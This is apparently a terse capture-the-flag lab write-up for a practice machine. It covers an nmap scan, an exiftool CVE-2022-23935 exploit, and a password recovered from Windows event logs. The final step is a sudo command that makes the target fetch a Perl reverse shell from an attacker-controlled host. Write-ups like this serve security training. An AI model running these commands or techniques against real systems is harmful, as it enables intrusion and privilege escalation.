# Investigation 

## IP = 10.10.11.197

## Nmap (initial)
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-20 09:15 EDT
Nmap scan report for eforenzics.htb (10.10.11.197)
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: eForenzics - Premier Digital Forensics
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploit on exiftool version 12.37
https://github.com/0xFTW/CVE-2022-23935
```
ExifTool Version Number         : 12.37
File Name                       : bash
Directory                       : .
File Size                       : 29 bytes
File Modification Date/Time     : 2023:04:20 13:53:57+00:00
File Access Date/Time           : 2023:04:20 13:53:57+00:00
File Inode Change Date/Time     : 2023:04:20 13:53:57+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : Corrupted PNG image
```

### Using chainsaw on "Windows Event Logs for Analysis.msg", grepping for 0xC0000064 (User tried login with wrong password)
```
"SubStatus": "0xc0000064",
"SubjectDomainName": "WORKGROUP",
"SubjectLogonId": "0x3e7",
"SubjectUserName": "EFORENZICS-DI$",
"SubjectUserSid": "S-1-5-18",
"TargetDomainName": "",
"TargetUserName": "Def@ultf0r3nz!csPa$$",
"TargetUserSid": "S-1-0-0",
"TransmittedServices": "-",
"WorkstationName": "EFORENZICS-DI"
```

### smorton:Def@ultf0r3nz!csPa$$

### user.txt

### sudo -l
```
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

### Just create a Perl revshell
`sudo /usr/bin/binary http://10.10.16.14:8000/perl_revshell.pl lDnxUysaQn`


### root.txt